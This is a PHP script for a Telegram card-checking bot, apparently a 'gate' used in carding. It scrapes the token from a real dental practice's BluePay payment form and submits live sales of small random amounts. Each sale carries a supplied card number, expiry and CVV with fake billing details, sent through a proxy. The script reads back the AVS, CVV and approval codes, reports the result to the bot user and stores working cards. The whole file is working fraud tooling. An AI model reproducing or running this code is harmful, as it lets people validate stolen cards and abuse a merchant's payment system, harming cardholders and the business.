<?php

use App\Models\Bot;
use App\Gate\{Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# -- REQ 1 -- #
$header1 = ['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'Host: secure.bluepay.com', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'referer: https://www.duvalorthosmiles.com/'];
$req1 = Make::Create(1, ['url' => 'https://secure.bluepay.com/interfaces/shpf?SHPF_FORM_ID=duvallDDS&SHPF_ACCOUNT_ID=100123937080&SHPF_TPS_DEF=SHPF_FORM_ID%20SHPF_ACCOUNT_ID%20DBA%20TAMPER_PROOF_SEAL%20AMEX_IMAGE%20DISCOVER_IMAGE%20TPS_DEF%20SHPF_TPS_DEF%20CUSTOM_HTML%20REBILLING%20REB_CYCLES%20REB_AMOUNT%20REB_EXPR%20REB_FIRST_DATE&SHPF_TPS=965fdee8141899119faaa09864b2f889&MODE=LIVE&TRANSACTION_TYPE=SALE&DBA=Jamal%20Duval%20DDS%20PC&AMOUNT=&TAMPER_PROOF_SEAL=6696375ed87e10610413f93e3bbb487a&CUSTOM_ID=&CUSTOM_ID2=&REBILLING=0&REB_CYCLES=&REB_AMOUNT=&REB_EXPR=&REB_FIRST_DATE=&AMEX_IMAGE=spacer.gif&DISCOVER_IMAGE=discvr.gif&REDIRECT_URL=https://secure.bluepay.com/interfaces/shpf%3FSHPF_FORM_ID%3DduvallDDSend%26SHPF_ACCOUNT_ID%3D100123937080%26SHPF_TPS_DEF%3DSHPF_ACCOUNT_ID%20SHPF_FORM_ID%20RETURN_URL%20DBA%20AMEX_IMAGE%20DISCOVER_IMAGE%20SHPF_TPS_DEF%26SHPF_TPS%3Db74cc92e3b5f6afa806570e3b073de74%26RETURN_URL%3Dhttp%253A%252F%252Fwarnerrobinsbraces%252Ecom%252F%26DBA%3DJamal%2520Duval%2520DDS%2520PC%26AMEX_IMAGE%3Dspacer%252Egif%26DISCOVER_IMAGE%3Ddiscvr%252Egif&TPS_DEF=MERCHANT%20APPROVED_URL%20DECLINED_URL%20MISSING_URL%20MODE%20TRANSACTION_TYPE%20TPS_DEF%20REBILLING%20REB_CYCLES%20REB_AMOUNT%20REB_EXPR%20REB_FIRST_DATE&CUSTOM_HTML=', 'method' => 'GET', 'post' => null, 'headers' => $header1, 'cookie' => null, 'proxy' => $proxy2], $gate, $user);
IsUnspam($req1, $user);

$token = Make::Analize($req1->body, '//*[@id="mainform"]/input[3]/@value')[0];
$merchant = Make::Analize(null, '//*[@id="mainform"]/input[1]/@value')[0];

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

# -- REQ 2 -- #
$amount = rand(5, 15);
$header2 = [ 'Host: secure.bluepay.com', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Content-Type: application/x-www-form-urlencoded', 'Origin: https://secure.bluepay.com', 'Referer: https://secure.bluepay.com/interfaces/shpf?SHPF_FORM_ID=duvallDDS&SHPF_ACCOUNT_ID=100123937080&SHPF_TPS_DEF=SHPF_FORM_ID%20SHPF_ACCOUNT_ID%20DBA%20TAMPER_PROOF_SEAL%20AMEX_IMAGE%20DISCOVER_IMAGE%20TPS_DEF%20SHPF_TPS_DEF%20CUSTOM_HTML%20REBILLING%20REB_CYCLES%20REB_AMOUNT%20REB_EXPR%20REB_FIRST_DATE&SHPF_TPS=965fdee8141899119faaa09864b2f889&MODE=LIVE&TRANSACTION_TYPE=SALE&DBA=Jamal%20Duval%20DDS%20PC&AMOUNT=&TAMPER_PROOF_SEAL=6696375ed87e10610413f93e3bbb487a&CUSTOM_ID=&CUSTOM_ID2=&REBILLING=0&REB_CYCLES=&REB_AMOUNT=&REB_EXPR=&REB_FIRST_DATE=&AMEX_IMAGE=spacer.gif&DISCOVER_IMAGE=discvr.gif&REDIRECT_URL=https://secure.bluepay.com/interfaces/shpf%3FSHPF_FORM_ID%3DduvallDDSend%26SHPF_ACCOUNT_ID%3D100123937080%26SHPF_TPS_DEF%3DSHPF_ACCOUNT_ID%20SHPF_FORM_ID%20RETURN_URL%20DBA%20AMEX_IMAGE%20DISCOVER_IMAGE%20SHPF_TPS_DEF%26SHPF_TPS%3Db74cc92e3b5f6afa806570e3b073de74%26RETURN_URL%3Dhttp%253A%252F%252Fwarnerrobinsbraces%252Ecom%252F%26DBA%3DJamal%2520Duval%2520DDS%2520PC%26AMEX_IMAGE%3Dspacer%252Egif%26DISCOVER_IMAGE%3Ddiscvr%252Egif&TPS_DEF=MERCHANT%20APPROVED_URL%20DECLINED_URL%20MISSING_URL%20MODE%20TRANSACTION_TYPE%20TPS_DEF%20REBILLING%20REB_CYCLES%20REB_AMOUNT%20REB_EXPR%20REB_FIRST_DATE&CUSTOM_HTML='];
$post2 = 'MERCHANT='.$merchant.'&TRANSACTION_TYPE=SALE&TAMPER_PROOF_SEAL='.$token.'&APPROVED_URL=https%3A%2F%2Fsecure.bluepay.com%2Finterfaces%2Fshpf%3FSHPF_FORM_ID%3DduvallDDSend%26SHPF_ACCOUNT_ID%3D100123937080%26SHPF_TPS_DEF%3DSHPF_ACCOUNT_ID+SHPF_FORM_ID+RETURN_URL+DBA+AMEX_IMAGE+DISCOVER_IMAGE+SHPF_TPS_DEF%26SHPF_TPS%3Db74cc92e3b5f6afa806570e3b073de74%26RETURN_URL%3Dhttp%253A%252F%252Fwarnerrobinsbraces%252Ecom%252F%26DBA%3DJamal%2520Duval%2520DDS%2520PC%26AMEX_IMAGE%3Dspacer%252Egif%26DISCOVER_IMAGE%3Ddiscvr%252Egif&DECLINED_URL=https%3A%2F%2Fsecure.bluepay.com%2Finterfaces%2Fshpf%3FSHPF_FORM_ID%3DduvallDDSend%26SHPF_ACCOUNT_ID%3D100123937080%26SHPF_TPS_DEF%3DSHPF_ACCOUNT_ID+SHPF_FORM_ID+RETURN_URL+DBA+AMEX_IMAGE+DISCOVER_IMAGE+SHPF_TPS_DEF%26SHPF_TPS%3Db74cc92e3b5f6afa806570e3b073de74%26RETURN_URL%3Dhttp%253A%252F%252Fwarnerrobinsbraces%252Ecom%252F%26DBA%3DJamal%2520Duval%2520DDS%2520PC%26AMEX_IMAGE%3Dspacer%252Egif%26DISCOVER_IMAGE%3Ddiscvr%252Egif&MISSING_URL=https%3A%2F%2Fsecure.bluepay.com%2Finterfaces%2Fshpf%3FSHPF_FORM_ID%3DduvallDDSend%26SHPF_ACCOUNT_ID%3D100123937080%26SHPF_TPS_DEF%3DSHPF_ACCOUNT_ID+SHPF_FORM_ID+RETURN_URL+DBA+AMEX_IMAGE+DISCOVER_IMAGE+SHPF_TPS_DEF%26SHPF_TPS%3Db74cc92e3b5f6afa806570e3b073de74%26RETURN_URL%3Dhttp%253A%252F%252Fwarnerrobinsbraces%252Ecom%252F%26DBA%3DJamal%2520Duval%2520DDS%2520PC%26AMEX_IMAGE%3Dspacer%252Egif%26DISCOVER_IMAGE%3Ddiscvr%252Egif&MODE=LIVE&CUSTOM_ID=&COMMENT=BluePay+Express+Form+BP10emu&REBILLING=0&REB_CYCLES=&REB_AMOUNT=&REB_EXPR=&REB_FIRST_DATE=&TPS_DEF=MERCHANT+APPROVED_URL+DECLINED_URL+MISSING_URL+MODE+TRANSACTION_TYPE+TPS_DEF+REBILLING+REB_CYCLES+REB_AMOUNT+REB_EXPR+REB_FIRST_DATE&TPS_HASH_TYPE=&MERCHDATA_shpf-form-id=duvallDDS&AMOUNT='.$amount.'&CUSTOM_ID2=&CC_NUM='.$cc[0].'&ORDER_ID=&CVCCVV2='.$cc[3].'&CC_EXPIRES_MONTH='.$cc[1].'&CC_EXPIRES_YEAR='.substr($cc[2], -2).'&NAME='.Name::firstName().'+'.Name::lastName().'&COMPANY_NAME=&ADDR1='.Address::streetAddress().'&CITY='.Address::city().'&STATE='.Address::state().'&ZIPCODE='.Address::zip().'&PHONE='.PhoneNumber::OnlyPhone().'&EMAIL='.Internet::freeEmail();
$req2 = Make::Create(2, ['url' => 'https://secure.bluepay.com/interfaces/bp10emu', 'method' => 'POST', 'post' => $post2, 'headers' => $header2, 'cookie' => null, 'proxy' => $proxy2], $gate, $user);
IsUnspam($req2, $user);

$urla = urldecode($req2->headers->response['Location']);
$params = [];
parse_str(parse_url($urla, PHP_URL_QUERY), $params);

$avs = @$params['AVS'];
$cvv2 = @$params['CVV2'];
$res_result = @$params['Result'];
$res_msg = @$params['MESSAGE'];

Res::SetParams(strtoupper($res_result), strtoupper($res_msg), $avs, $cvv2, $req2->body);
$res = Res::Bluepay();
print_r($params);
print_r($res);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));

try {
    $live = Make::SaveLive($res['live'], $user['id'], implode('|', $cc), $gate['name'], $res, $ccs['bin']);
} catch (\Exception $e) {
    error_log($e->getMessage());
    echo $e->getMessage();
}